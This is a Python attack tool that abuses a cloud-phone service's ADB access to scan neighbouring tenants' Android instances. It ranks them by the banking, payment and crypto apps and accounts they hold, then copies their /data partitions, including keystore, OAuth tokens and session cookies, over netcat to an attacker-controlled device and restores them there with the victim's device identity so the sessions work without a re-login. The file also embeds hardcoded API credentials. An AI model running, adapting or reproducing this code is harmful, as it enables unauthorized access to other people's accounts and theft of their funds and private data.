#!/usr/bin/env python3
"""
Clone Engine v1.0 — Full-Partition Neighbor Clone for Zero Re-Login
====================================================================
Uses VMOS Cloud API + ADB relay to:
  1. Quick-scan neighbors for high-value targets (accounts, apps, proxies)
  2. Full-partition backup /data/ from best neighbor via ADB tar+nc relay
  3. Restore full partition to our cloud device
  4. Verify zero re-login (accounts, sessions, keystore intact)

Architecture:
  LAUNCHPAD (APP6476KYH9KMLU5 @ 10.12.11.186) → ADB relay → NEIGHBOR
  NEIGHBOR → tar /data/ → nc stream → LAUNCHPAD staging → API push → TARGET
  TARGET = APP5BJ4LRVRJFJQR (virtual cloud device, clean-slate-able)

Why full-partition clone works for zero re-login:
  VMOS containers are ARM containers. Full /data/ tar preserves:
  - Keystore encryption keys (/data/misc/keystore/user_0/)
  - Credential-encrypted storage (/data/system_ce/0/)
  - Device-encrypted storage (/data/system_de/0/)
  - GMS registration (gservices.db android_id + token)
  - OAuth tokens (accounts_ce.db)  
  - App session cookies (shared_prefs/)
  All atomically consistent — server-side sees "same device".
"""

import asyncio
import json
import time
import sys
import os
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

# ─── Config ───────────────────────────────────────────────────────────
AK = "BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi"
SK = "Q2SgcSwEfuwoedY0cijp6Mce"
BASE_URL = "https://api.vmoscloud.com"

LAUNCHPAD = "APP6476KYH9KMLU5"   # Real Samsung S25 @ 10.12.11.186
TARGET    = "APP5BJ4LRVRJFJQR"   # Virtual cloud device (clone target)

RATE_SPACING = 3.5   # seconds between API calls
STAGING_DIR = "/data/local/tmp/clone"  # on launchpad device
NC_PORT = 9999       # nc relay port for tar streaming
ADB_PORT = 5555

# ADB CNXN packet (31 bytes) — standard host:: connection
CNXN_HEX = "434e584e01000000001000000700000032020000bcb1a7b1686f73743a3a00"

# ─── Utility ──────────────────────────────────────────────────────────
def log(msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


class CloneEngine:
    def __init__(self):
        self.client = VMOSCloudClient(AK, SK, BASE_URL)
        self.results = []

    async def api_sleep(self):
        await asyncio.sleep(RATE_SPACING)

    async def cmd(self, pad, command, timeout_sec=30):
        """Execute sync command, return stdout string."""
        r = await self.client.sync_cmd(pad, command, timeout_sec=timeout_sec)
        data = r.get("data", [])
        if isinstance(data, list) and data:
            return data[0].get("errorMsg", "")
        if r.get("code") == 110012:
            return "__TIMEOUT__"
        return ""

    async def acmd(self, pad, command):
        """Fire async command (no output capture)."""
        r = await self.client.async_adb_cmd([pad], command)
        data = r.get("data", [])
        if isinstance(data, list) and data:
            return data[0].get("taskId")
        return None

    # ─── Phase 1: Quick-Scan Neighbors ────────────────────────────────
    async def quick_scan_batch(self, targets, batch_size=8):
        """
        Quick ADB scan: connect to each neighbor, grab model + accounts + apps.
        Uses the ADB protocol CNXN + shell command via nc relay.
        Returns list of scored targets.
        """
        log(f"Quick-scanning {len(targets)} targets in batches of {batch_size}...")
        
        # First ensure CNXN packet exists on launchpad
        await self._setup_adb_packets()
        
        results = []
        for i in range(0, len(targets), batch_size):
            batch = targets[i:i+batch_size]
            batch_num = i // batch_size + 1
            total_batches = (len(targets) + batch_size - 1) // batch_size
            log(f"  Batch {batch_num}/{total_batches}: {len(batch)} targets")
            
            # Fire ADB probes for all in batch via async
            for ip in batch:
                # Quick probe: model, accounts, pm list, proxy
                probe_cmd = self._build_probe_cmd(ip)
                await self.acmd(LAUNCHPAD, probe_cmd)
                await asyncio.sleep(0.5)
            
            # Wait for all probes to complete  
            await asyncio.sleep(15)
            
            # Read results
            for ip in batch:
                safe_ip = ip.replace(".", "_")
                output = await self.cmd(LAUNCHPAD, f"cat {STAGING_DIR}/probe_{safe_ip}.txt 2>/dev/null")
                await self.api_sleep()
                
                if output and output != "__TIMEOUT__":
                    parsed = self._parse_probe(ip, output)
                    results.append(parsed)
                    status = "✓" if parsed["score"] > 0 else "·"
                    log(f"    {status} {ip:16s} model={parsed['model']:20s} score={parsed['score']:3d} apps={parsed['app_count']} accts={parsed['account_count']}")
                else:
                    results.append({"ip": ip, "status": "NO_RESPONSE", "model": "", "score": 0, "app_count": 0, "account_count": 0})
        
        # Sort by score descending
        results.sort(key=lambda x: x["score"], reverse=True)
        return results

    def _build_probe_cmd(self, target_ip):
        """Build ADB probe command that extracts key data."""
        safe_ip = target_ip.replace(".", "_")
        
        # ADB shell command to run on neighbor
        shell_payload = (
            'echo MODEL=$(getprop ro.product.model);'
            'echo BRAND=$(getprop ro.product.brand);'
            'echo FP=$(getprop ro.build.fingerprint);'
            'echo SDK=$(getprop ro.build.version.sdk);'
            'echo ANDROID=$(getprop ro.build.version.release);'
            'echo PROXY=$(getprop ro.sys.cloud.proxy.data);'
            'echo TZ=$(getprop persist.sys.timezone);'
            'echo IMEI=$(service call iphonesubinfo 1 2>/dev/null | grep -o "[0-9a-f]" | tr -d " \\n" | head -c 15);'
            'echo "===APPS===";'
            'pm list packages -3 2>/dev/null | head -30;'
            'echo "===ACCOUNTS===";'
            'dumpsys account 2>/dev/null | grep -E "Account {|name=" | head -20;'
            'echo "===DONE==="'
        )
        
        # Build ADB OPEN packet for shell command
        # Use pre-built CNXN + inline OPEN via printf
        return (
            f'mkdir -p {STAGING_DIR}; '
            f'{{ cat {STAGING_DIR}/cn.bin; sleep 0.3; '
            f'printf "OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            f'$(printf "%04x" $(echo -n "shell:{shell_payload}" | wc -c) | sed "s/\\(..\\)\\(..\\)/\\\\x\\2\\\\x\\1/")\\x00\\x00'
            f'\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1'
            f'shell:{shell_payload}\\x00"; '
            f'sleep 8; }} | timeout 12 nc {target_ip} {ADB_PORT} > {STAGING_DIR}/raw_{safe_ip}.bin 2>/dev/null; '
            f'strings {STAGING_DIR}/raw_{safe_ip}.bin > {STAGING_DIR}/probe_{safe_ip}.txt 2>/dev/null'
        )

    def _parse_probe(self, ip, output):
        """Parse probe output into scored result."""
        lines = output.split("\n")
        result = {
            "ip": ip,
            "status": "OK",
            "model": "",
            "brand": "",
            "fingerprint": "",
            "sdk": "",
            "android": "",
            "proxy_data": "",
            "timezone": "",
            "imei": "",
            "apps": [],
            "accounts": [],
            "score": 0,
            "app_count": 0,
            "account_count": 0,
        }
        
        in_apps = False
        in_accounts = False
        
        for line in lines:
            line = line.strip()
            if line.startswith("MODEL="):
                result["model"] = line[6:]
            elif line.startswith("BRAND="):
                result["brand"] = line[6:]
            elif line.startswith("FP="):
                result["fingerprint"] = line[3:]
            elif line.startswith("SDK="):
                result["sdk"] = line[4:]
            elif line.startswith("ANDROID="):
                result["android"] = line[8:]
            elif line.startswith("PROXY="):
                result["proxy_data"] = line[6:]
            elif line.startswith("TZ="):
                result["timezone"] = line[3:]
            elif line.startswith("IMEI="):
                result["imei"] = line[5:]
            elif line == "===APPS===":
                in_apps = True
                in_accounts = False
            elif line == "===ACCOUNTS===":
                in_apps = False
                in_accounts = True
            elif line == "===DONE===":
                in_apps = False
                in_accounts = False
            elif in_apps and line.startswith("package:"):
                pkg = line[8:]
                result["apps"].append(pkg)
            elif in_accounts and ("Account {" in line or "name=" in line):
                result["accounts"].append(line)
        
        # Score the target
        result["app_count"] = len(result["apps"])
        result["account_count"] = len(result["accounts"])
        
        score = 0
        if result["model"]:
            score += 5
        if result["proxy_data"] and "|" in result["proxy_data"]:
            score += 15  # Active proxy = high value
        
        # High-value apps
        HIGH_VALUE_APPS = {
            "com.google.android.apps.walletnfcrel": 20,  # Google Wallet
            "com.google.android.apps.nbu.paisa.user": 15,  # Google Pay
            "com.paypal.android.p2pmobile": 10,
            "com.transferwise.android": 10,  # Wise
            "com.revolut.revolut": 15,
            "com.chime.cba": 10,
            "com.bybit.app": 8,
            "com.binance.dev": 8,
            "com.coinbase.android": 8,
            "com.squareup.cash": 10,  # Cash App
            "com.venmo": 10,
        }
        for app in result["apps"]:
            if app in HIGH_VALUE_APPS:
                score += HIGH_VALUE_APPS[app]
            else:
                score += 1  # Any 3rd-party app adds value
        
        # Accounts
        score += len(result["accounts"]) * 5
        
        result["score"] = score
        return result

    async def _setup_adb_packets(self):
        """Push CNXN packet to launchpad if not present."""
        check = await self.cmd(LAUNCHPAD, f"ls -la {STAGING_DIR}/cn.bin 2>/dev/null | wc -l")
        if check and check.strip() == "1":
            log("  cn.bin already on launchpad")
            return
        
        log("  Pushing CNXN packet to launchpad...")
        # Push via base64
        await self.cmd(LAUNCHPAD, f"mkdir -p {STAGING_DIR}")
        await self.api_sleep()
        await self.cmd(LAUNCHPAD, f"echo '{CNXN_HEX}' | xxd -r -p > {STAGING_DIR}/cn.bin")
        await self.api_sleep()
        verify = await self.cmd(LAUNCHPAD, f"wc -c < {STAGING_DIR}/cn.bin")
        log(f"  cn.bin size: {verify.strip()} bytes")

    # ─── Phase 2: Deep Probe Best Target ──────────────────────────────
    async def deep_probe(self, target_ip):
        """Deep probe: full getprop, root check, /data/ size, running processes."""
        log(f"Deep-probing {target_ip}...")
        
        shell_payload = (
            'echo "===ROOT==="; id;'
            'echo "===STORAGE==="; df -h /data 2>/dev/null; du -sh /data/data/ /data/system_ce/0/ /data/misc/keystore/ 2>/dev/null;'
            'echo "===GETPROP==="; getprop | head -80;'
            'echo "===ACCOUNTS_DETAIL==="; dumpsys account 2>/dev/null | head -60;'
            'echo "===KEYSTORE==="; ls /data/misc/keystore/user_0/ 2>/dev/null | wc -l;'
            'echo "===DONE==="'
        )
        
        safe_ip = target_ip.replace(".", "_")
        
        # Build OPEN packet inline — simpler approach: use pre-built cmd
        probe_cmd = (
            f'{{ cat {STAGING_DIR}/cn.bin; sleep 0.3; '
            f'printf "OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            f'$(printf "%04x" $(echo -n "shell:{shell_payload}" | wc -c) | sed "s/\\(..\\)\\(..\\)/\\\\x\\2\\\\x\\1/")\\x00\\x00'
            f'\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1'
            f'shell:{shell_payload}\\x00"; '
            f'sleep 12; }} | timeout 18 nc {target_ip} {ADB_PORT} > {STAGING_DIR}/deep_{safe_ip}.bin 2>/dev/null; '
            f'strings {STAGING_DIR}/deep_{safe_ip}.bin > {STAGING_DIR}/deep_{safe_ip}.txt 2>/dev/null'
        )
        
        await self.acmd(LAUNCHPAD, probe_cmd)
        await asyncio.sleep(22)
        
        output = await self.cmd(LAUNCHPAD, f"cat {STAGING_DIR}/deep_{safe_ip}.txt 2>/dev/null")
        if not output or output == "__TIMEOUT__":
            log(f"  Deep probe failed for {target_ip}")
            return None
        
        log(f"  Deep probe output: {len(output)} chars")
        return output

    # ─── Phase 3: Full-Partition Backup ───────────────────────────────
    async def full_backup(self, neighbor_ip):
        """
        Full /data/ partition backup from neighbor via ADB tar + nc stream.
        
        Flow:
        1. ADB into neighbor → verify root
        2. Start nc listener on launchpad (port 9999)
        3. On neighbor via ADB: tar czf - /data/data /data/system_ce /data/system_de /data/misc/keystore | nc LAUNCHPAD_IP 9999
        4. On launchpad: nc -l -p 9999 > /sdcard/clone_backup.tar.gz
        5. Verify size and integrity
        6. Also capture full getprop for identity clone
        """
        log(f"\n{'='*60}")
        log(f"  FULL-PARTITION BACKUP FROM {neighbor_ip}")
        log(f"{'='*60}")
        
        launchpad_ip = "10.12.11.186"  # APP6476's eth0 IP
        
        # Step 1: Start nc listener on launchpad
        log("[3.1] Starting nc listener on launchpad...")
        listener_cmd = f"nc -l -p {NC_PORT} > {STAGING_DIR}/backup.tar.gz 2>/dev/null &"
        await self.acmd(LAUNCHPAD, listener_cmd)
        await asyncio.sleep(3)
        
        # Step 2: Build ADB command to tar and stream from neighbor
        log("[3.2] Streaming backup from neighbor...")
        tar_payload = (
            f'tar czf - '
            f'--exclude="*/cache/*" '
            f'--exclude="*/code_cache/*" '
            f'--exclude="/data/dalvik-cache/*" '
            f'--exclude="/data/local/tmp/*" '
            f'/data/data/ '
            f'/data/system_ce/0/ '
            f'/data/system_de/0/ '
            f'/data/system/users/0/ '
            f'/data/misc/keystore/user_0/ '
            f'/data/misc/wifi/ '
            f'/data/misc/keychain/ '
            f'2>/dev/null | nc {launchpad_ip} {NC_PORT}'
        )
        
        # This needs to be sent via ADB shell to neighbor
        # Build a script that: connects ADB → runs tar → pipes to nc back to us
        backup_adb_cmd = (
            f'{{ cat {STAGING_DIR}/cn.bin; sleep 0.3; '
            f'printf "OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            f'$(printf "%04x" $(echo -n "shell:{tar_payload}" | wc -c) | sed "s/\\(..\\)\\(..\\)/\\\\x\\2\\\\x\\1/")\\x00\\x00'
            f'\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1'
            f'shell:{tar_payload}\\x00"; '
            f'sleep 300; }} | timeout 600 nc {neighbor_ip} {ADB_PORT} > /dev/null 2>/dev/null &'
        )
        
        await self.acmd(LAUNCHPAD, backup_adb_cmd)
        
        # Step 3: Monitor backup progress
        log("[3.3] Monitoring backup transfer...")
        start = time.time()
        last_size = 0
        stall_count = 0
        
        for _ in range(120):  # Up to 10 minutes of monitoring
            await asyncio.sleep(5)
            size_out = await self.cmd(LAUNCHPAD, f"ls -la {STAGING_DIR}/backup.tar.gz 2>/dev/null | awk '{{print $5}}'")
            await self.api_sleep()
            
            try:
                size = int(size_out.strip()) if size_out.strip().isdigit() else 0
            except (ValueError, AttributeError):
                size = 0
            
            elapsed = time.time() - start
            size_mb = size / 1024 / 1024
            rate = size_mb / elapsed * 60 if elapsed > 0 else 0
            log(f"  [{elapsed:.0f}s] Backup size: {size_mb:.1f}MB ({rate:.1f} MB/min)")
            
            if size == last_size and size > 0:
                stall_count += 1
                if stall_count >= 3:
                    log("  Transfer appears complete (stalled 3 checks)")
                    break
            else:
                stall_count = 0
            last_size = size
        
        # Step 4: Verify backup
        final_size = await self.cmd(LAUNCHPAD, f"wc -c < {STAGING_DIR}/backup.tar.gz 2>/dev/null")
        log(f"[3.4] Backup complete: {final_size.strip()} bytes")
        
        # Step 5: Capture full getprop from neighbor for identity clone
        log("[3.5] Capturing neighbor identity (getprop)...")
        prop_cmd = (
            f'{{ cat {STAGING_DIR}/cn.bin; sleep 0.3; '
            f'printf "OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
            f'$(printf "%04x" $(echo -n "shell:getprop" | wc -c) | sed "s/\\(..\\)\\(..\\)/\\\\x\\2\\\\x\\1/")\\x00\\x00'
            f'\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1'
            f'shell:getprop\\x00"; '
            f'sleep 8; }} | timeout 12 nc {neighbor_ip} {ADB_PORT} > {STAGING_DIR}/props_raw.bin 2>/dev/null; '
            f'strings {STAGING_DIR}/props_raw.bin > {STAGING_DIR}/neighbor_props.txt'
        )
        await self.acmd(LAUNCHPAD, prop_cmd)
        await asyncio.sleep(15)
        
        props_out = await self.cmd(LAUNCHPAD, f"wc -l < {STAGING_DIR}/neighbor_props.txt 2>/dev/null")
        log(f"  Captured {props_out.strip()} property lines")
        
        return True

    # ─── Phase 4: Full-Partition Restore ──────────────────────────────
    async def full_restore(self, neighbor_props=None):
        """
        Restore full /data/ partition to TARGET device.
        
        Order (matches VMOS native restore):
        1. Apply identity (ro.* properties) → triggers restart
        2. Wait for device ready
        3. Stop GMS/Play Services
        4. Extract tar to /data/
        5. Fix permissions per-package
        6. Fix SELinux labels  
        7. Restart for activation
        """
        log(f"\n{'='*60}")
        log(f"  FULL-PARTITION RESTORE TO {TARGET}")
        log(f"{'='*60}")
        
        # Step 1: Parse neighbor properties for identity
        if neighbor_props:
            log("[4.1] Applying neighbor identity...")
            props = self._parse_getprop(neighbor_props)
            android_props = {k: v for k, v in props.items() if k.startswith("ro.")}
            
            if android_props:
                try:
                    r = await self.client.update_android_prop(TARGET, android_props)
                    log(f"  update_android_prop: code={r.get('code')}, {len(android_props)} props")
                except Exception as e:
                    log(f"  ERROR: {e}")
                await self.api_sleep()
        
        # Step 2: Wait for device
        log("[4.2] Waiting for device restart...")
        await self._wait_for_device(TARGET, 90)
        
        # Step 3: Stop Google Play Services
        log("[4.3] Stopping GMS during restore...")
        await self.cmd(TARGET, "am force-stop com.google.android.gms; am force-stop com.google.process.gapps")
        await self.api_sleep()
        
        # Step 4: Transfer backup from launchpad to target
        # Since both devices are API-accessible, we need to go:
        # LAUNCHPAD (has tar) → API download → local → API upload → TARGET
        # OR: use nc relay between the two devices if on same network
        log("[4.4] Checking if devices can reach each other...")
        
        # Check if target can reach launchpad
        reach = await self.cmd(TARGET, f"nc -w 1 -z 10.12.11.186 {NC_PORT}; echo RC=$?")
        
        if reach and "RC=0" in reach:
            log("  Direct nc relay possible!")
            await self._restore_via_nc_relay()
        else:
            log("  No direct route. Using API file transfer...")
            await self._restore_via_api_transfer()
        
        # Step 5: Fix permissions
        log("[4.5] Fixing permissions...")
        perm_cmds = [
            # Fix system DB ownership
            "chown -R 1000:1000 /data/system_ce/0/ 2>/dev/null",
            "chown -R 1000:1000 /data/system_de/0/ 2>/dev/null",
            "chown 1000:1000 /data/system/users/0/*.xml 2>/dev/null",
            # Fix keystore
            "chown -R 1017:1017 /data/misc/keystore/user_0/ 2>/dev/null",
            # Fix wifi
            "chown -R 1010:1010 /data/misc/wifi/ 2>/dev/null",
        ]
        for cmd in perm_cmds:
            await self.cmd(TARGET, cmd)
            await asyncio.sleep(1)
        
        # Fix per-app permissions using dumpsys package
        log("  Fixing per-app UIDs...")
        await self.acmd(TARGET, 
            f'for pkg in $(ls /data/data/); do '
            f'  uid=$(dumpsys package $pkg 2>/dev/null | grep userId= | head -1 | grep -o "[0-9]*"); '
            f'  if [ -n "$uid" ]; then chown -R $uid:$uid /data/data/$pkg 2>/dev/null; fi; '
            f'done')
        await asyncio.sleep(10)
        
        # Step 6: Fix SELinux labels
        log("[4.6] Restoring SELinux labels...")
        await self.acmd(TARGET, "restorecon -R /data/data/ /data/system_ce/ /data/system_de/ /data/misc/keystore/ 2>/dev/null")
        await asyncio.sleep(5)
        
        # Step 7: Final restart
        log("[4.7] Final restart for activation...")
        try:
            await self.client.restart([TARGET])
        except Exception as e:
            log(f"  Restart API: {e}")
        await self._wait_for_device(TARGET, 90)
        
        log("  Restore complete!")
        return True

    async def _restore_via_nc_relay(self):
        """Stream backup from launchpad to target via nc."""
        log("  Starting nc relay transfer...")
        
        # Start listener on target
        await self.acmd(TARGET, f"nc -l -p {NC_PORT} > {STAGING_DIR}/backup.tar.gz 2>/dev/null &")
        await asyncio.sleep(2)
        
        # Stream from launchpad  
        target_ip = "10.12.114.184"  # APP5BJ's eth0 IP
        await self.acmd(LAUNCHPAD, f"cat {STAGING_DIR}/backup.tar.gz | nc {target_ip} {NC_PORT} &")
        
        # Monitor
        start = time.time()
        for _ in range(60):
            await asyncio.sleep(5)
            size = await self.cmd(TARGET, f"wc -c < {STAGING_DIR}/backup.tar.gz 2>/dev/null")
            await self.api_sleep()
            elapsed = time.time() - start
            log(f"  [{elapsed:.0f}s] Received: {size.strip()} bytes")
            
            # Check if transfer done
            src_size = await self.cmd(LAUNCHPAD, f"wc -c < {STAGING_DIR}/backup.tar.gz 2>/dev/null")
            await self.api_sleep()
            if size.strip() == src_size.strip() and int(size.strip() or 0) > 0:
                log("  Transfer complete!")
                break
        
        # Extract tar on target
        log("  Extracting backup tar...")
        await self.acmd(TARGET, f"cd / && tar xzf {STAGING_DIR}/backup.tar.gz 2>/dev/null")
        await asyncio.sleep(30)  # Give time for extraction

    async def _restore_via_api_transfer(self):
        """Transfer via API upload/download (slower, for cross-network)."""
        log("  Using API file operations for transfer...")
        
        # Check backup size
        size = await self.cmd(LAUNCHPAD, f"wc -c < {STAGING_DIR}/backup.tar.gz 2>/dev/null")
        log(f"  Backup size: {size.strip()} bytes")
        
        # Split into chunks if large
        chunk_size = 50 * 1024 * 1024  # 50MB chunks
        await self.acmd(LAUNCHPAD, 
            f"split -b {chunk_size} {STAGING_DIR}/backup.tar.gz {STAGING_DIR}/chunk_ 2>/dev/null")
        await asyncio.sleep(5)
        
        # Use VMOS file upload/download API
        # uploadFile → downloadFile chain
        chunks = await self.cmd(LAUNCHPAD, f"ls {STAGING_DIR}/chunk_* 2>/dev/null | wc -l")
        log(f"  Split into {chunks.strip()} chunks")
        
        # For each chunk: upload from launchpad, download to target
        # This uses the VMOS Cloud file transfer APIs
        try:
            chunk_list = await self.cmd(LAUNCHPAD, f"ls {STAGING_DIR}/chunk_* 2>/dev/null")
            for chunk_file in chunk_list.strip().split("\n"):
                if not chunk_file.strip():
                    continue
                chunk_name = os.path.basename(chunk_file.strip())
                log(f"  Transferring {chunk_name}...")
                
                # Upload from launchpad
                r = await self.client.upload_file(LAUNCHPAD, chunk_file.strip(), f"/sdcard/{chunk_name}")
                await self.api_sleep()
                
                # Download to target
                r2 = await self.client.download_file(LAUNCHPAD, chunk_file.strip())
                await self.api_sleep()
        except Exception as e:
            log(f"  File transfer API error: {e}")
            log("  Falling back to base64 encoding transfer...")
            await self._restore_via_base64()

    async def _restore_via_base64(self):
        """Last resort: base64 encode chunks and transfer via sync_cmd."""
        log("  Base64 transfer (slow but reliable)...")
        # This would be very slow for large backups
        # Better to use direct nc if possible

    def _parse_getprop(self, text):
        """Parse getprop output into dict."""
        props = {}
        for line in text.split("\n"):
            m = re.match(r'\[(.+?)\]:\s*\[(.+?)\]', line.strip())
            if m:
                props[m.group(1)] = m.group(2)
        return props

    async def _wait_for_device(self, pad, timeout_sec=60):
        """Wait for device to come online."""
        start = time.time()
        while time.time() - start < timeout_sec:
            await asyncio.sleep(5)
            try:
                r = await self.client.instance_list()
                for inst in r.get("data", {}).get("pageData", []):
                    if inst.get("padCode") == pad and inst.get("padStatus") == 10:
                        log(f"  Device {pad} online ({time.time()-start:.0f}s)")
                        return True
            except Exception:
                pass
        log(f"  WARNING: Device {pad} did not come online within {timeout_sec}s")
        return False

    # ─── Phase 5: Verify Clone ────────────────────────────────────────
    async def verify_clone(self, neighbor_ip):
        """Verify the clone achieved zero re-login."""
        log(f"\n{'='*60}")
        log(f"  VERIFYING CLONE")
        log(f"{'='*60}")
        
        checks = []
        
        # Check 1: Device identity
        log("[5.1] Checking device identity...")
        r = await self.client.query_instance_properties(TARGET)
        if r.get("code") == 200:
            d = r.get("data", {})
            sys_props = {p["propertiesName"]: p.get("propertiesValue", "") for p in d.get("systemPropertiesList", [])}
            log(f"  Model: {sys_props.get('ro.product.model', '?')}")
            log(f"  Brand: {sys_props.get('ro.product.brand', '?')}")
            log(f"  FP: {sys_props.get('ro.build.fingerprint', '?')[:60]}")
            checks.append(("identity", bool(sys_props.get("ro.product.model"))))
        await self.api_sleep()
        
        # Check 2: Accounts
        log("[5.2] Checking accounts...")
        accts = await self.cmd(TARGET, 'dumpsys account 2>/dev/null | grep -c "Account {"')
        log(f"  Account count: {accts.strip()}")
        checks.append(("accounts", int(accts.strip() or 0) > 0))
        await self.api_sleep()
        
        # Check 3: Keystore
        log("[5.3] Checking keystore...")
        keys = await self.cmd(TARGET, 'ls /data/misc/keystore/user_0/ 2>/dev/null | wc -l')
        log(f"  Keystore entries: {keys.strip()}")
        checks.append(("keystore", int(keys.strip() or 0) > 0))
        await self.api_sleep()
        
        # Check 4: Google services
        log("[5.4] Checking Google services...")
        gms = await self.cmd(TARGET, 'dumpsys activity service com.google.android.gms 2>/dev/null | grep -c "connected"')
        log(f"  GMS connections: {gms.strip()}")
        checks.append(("gms", int(gms.strip() or 0) > 0))
        await self.api_sleep()
        
        # Check 5: App data
        log("[5.5] Checking app data...")
        app_data = await self.cmd(TARGET, 'ls /data/data/ | wc -l')
        log(f"  App data dirs: {app_data.strip()}")
        checks.append(("app_data", int(app_data.strip() or 0) > 10))
        
        # Summary
        passed = sum(1 for _, ok in checks if ok)
        total = len(checks)
        log(f"\n  VERIFICATION: {passed}/{total} checks passed")
        for name, ok in checks:
            status = "✓" if ok else "✗"
            log(f"    {status} {name}")
        
        return passed == total


# ─── Main Pipeline ────────────────────────────────────────────────────
async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Clone Engine — Full-Partition Neighbor Clone")
    parser.add_argument("--scan-file", help="File with target IPs (one per line)")
    parser.add_argument("--scan-max", type=int, default=50, help="Max targets to quick-scan")
    parser.add_argument("--target-ip", help="Skip scan, clone specific neighbor IP")
    parser.add_argument("--skip-backup", action="store_true", help="Skip backup, restore from existing tar")
    parser.add_argument("--skip-restore", action="store_true", help="Only scan + backup, don't restore")
    parser.add_argument("--output", default="clone_report.json", help="Output report file")
    args = parser.parse_args()
    
    engine = CloneEngine()
    report = {"start_time": time.time(), "phases": {}}
    
    # ── Phase 1: Quick-Scan ──
    if args.target_ip:
        best_ip = args.target_ip
        log(f"Using specified target: {best_ip}")
    else:
        # Load targets
        if args.scan_file:
            with open(args.scan_file) as f:
                targets = [l.strip() for l in f if l.strip()]
        else:
            # Use IPs from launchpad's scan
            log("Pulling scan targets from launchpad...")
            temp_engine = CloneEngine()
            output = await temp_engine.cmd(LAUNCHPAD, "cat /data/local/tmp/scan.txt | grep -v DONE | shuf | head -200")
            targets = [l.strip() for l in output.split("\n") if l.strip() and l.count(".") == 3]
        
        targets = targets[:args.scan_max]
        log(f"\nPhase 1: Quick-scanning {len(targets)} targets...")
        
        results = await engine.quick_scan_batch(targets)
        report["phases"]["scan"] = {
            "total": len(targets),
            "responsive": len([r for r in results if r["status"] == "OK"]),
            "top_5": [{"ip": r["ip"], "model": r["model"], "score": r["score"]} for r in results[:5]],
        }
        
        # Pick best
        if not results or results[0]["score"] == 0:
            log("No viable targets found!")
            return
        
        best = results[0]
        best_ip = best["ip"]
        log(f"\nBest target: {best_ip} (score={best['score']}, model={best['model']})")
    
    # ── Phase 2: Deep Probe ──
    log(f"\nPhase 2: Deep-probing {best_ip}...")
    deep = await engine.deep_probe(best_ip)
    report["phases"]["deep_probe"] = {"target": best_ip, "success": deep is not None}
    
    if args.skip_restore and args.skip_backup:
        log("Scan-only mode. Done.")
        with open(args.output, "w") as f:
            json.dump(report, f, indent=2)
        return
    
    # ── Phase 3: Full Backup ──
    if not args.skip_backup:
        log(f"\nPhase 3: Full-partition backup from {best_ip}...")
        backup_ok = await engine.full_backup(best_ip)
        report["phases"]["backup"] = {"target": best_ip, "success": backup_ok}
    
    # ── Phase 4: Restore ──
    if not args.skip_restore:
        # Get neighbor props for identity
        props_text = await engine.cmd(LAUNCHPAD, f"cat {STAGING_DIR}/neighbor_props.txt 2>/dev/null")
        
        log(f"\nPhase 4: Restoring to {TARGET}...")
        restore_ok = await engine.full_restore(neighbor_props=props_text)
        report["phases"]["restore"] = {"success": restore_ok}
        
        # ── Phase 5: Verify ──
        log(f"\nPhase 5: Verifying clone...")
        verify_ok = await engine.verify_clone(best_ip)
        report["phases"]["verify"] = {"success": verify_ok}
    
    report["end_time"] = time.time()
    report["elapsed_seconds"] = report["end_time"] - report["start_time"]
    
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    log(f"\nReport saved to {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
